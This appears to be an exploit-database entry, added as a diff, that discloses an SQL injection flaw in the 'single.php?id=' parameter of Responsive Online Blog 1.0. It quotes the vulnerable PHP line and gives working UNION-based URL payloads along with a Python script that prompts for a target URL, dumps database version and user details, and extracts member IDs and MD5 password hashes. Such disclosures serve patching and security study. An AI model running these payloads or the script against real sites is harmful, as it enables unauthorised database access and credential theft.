@@ -1,0 +1,63 @@
+id: 34671
+date: 07/12/2020
+title: Responsive Online Blog 1.0 SQL Injection Vulnerability (2)
+author: Eren Şimşek
+cves: 
+
+# Exploit Title: Responsive Online Blog 1.0 - 'single.php?id=' SQL Injection
+# Exploit Author: gh1mau
+# Team Members: Capt'N,muzzo,chaos689 | https://h0fclanmalaysia.wordpress.com/
+# Vendor Homepage: https://www.sourcecodester.com/php/14194/responsive-online-blog-website-using-phpmysql.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14194&title=Responsive+Online+Blog+Website+using+PHP%2FMySQL
+# Version: v1.0
+# Tested on: PHP 5.6.18, Apache/2.4.18 (Win32), Ver 14.14 Distrib 5.7.11, for Win32 (AMD64)
+
+Vulnerable File:
+---------------- 
+single.php
+
+Vulnerable Code:
+-----------------
+line 4: $id=$_REQUEST['id']; $query="SELECT * from blogs where id='".$id."'"; $result=mysqli_query($GLOBALS["___mysqli_ston"],$query) or die ( ((is_object($GLOBALS["___mysqli_ston"]))? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ?$___mysqli_res : true))); 
+
+
+Vulnerable Issue:
+-----------------
+$id=$_REQUEST['id'] has no sanitization
+
+POC:
+----
+
+[Basic Info]
+http://localhost/resblog/single.php?id='+UNION+ALL+SELECT+NULL,CONCAT_WS(0x3a,version(),database(),user()),NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-
+
+[User Credential Enumeration]
+http://localhost/resblog/single.php?id='+UNION+ALL+SELECT+NULL,CONCAT_WS(0x3a,memberID,passMD5),NULL,NULL,NULL,NULL,NULL,NULL,NULL+FROM+membership_users--+-
+
+Python POC:
+----------
+import requests,re
+
+
+URL = input("URL : <Ex: http://localhost/resblog>\n")
+vulnFile = "/single.php?id="
+payloadA = "'+UNION+ALL+SELECT+NULL,CONCAT('gh1mau',version(),0x3a,database(),0x3a,user(),'gh1mau'),NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-"
+payloadB = "'+UNION+ALL+SELECT+NULL,CONCAT('gh1mau',memberID,0x3a,passMD5,'gh1mau'),NULL,NULL,NULL,NULL,NULL,NULL,NULL+FROM+membership_users--+-"
+
+#print("\nPayload Testing : \n" + URL + vulnFile + payloadA + "\n")
+pattern = "(?<=gh1mau).*?(?=gh1mau)"
+
+rA = requests.get(URL+vulnFile+payloadA)
+version=re.findall(pattern,rA.text)
+
+print("Basic Info:")
+print(version)
+
+rB = requests.get(URL+vulnFile+payloadB)
+user=re.findall(pattern,rB.text)
+
+print("\nCredentials:")
+print(user)
+
+
+#  0day.today [2023-03-25]  #
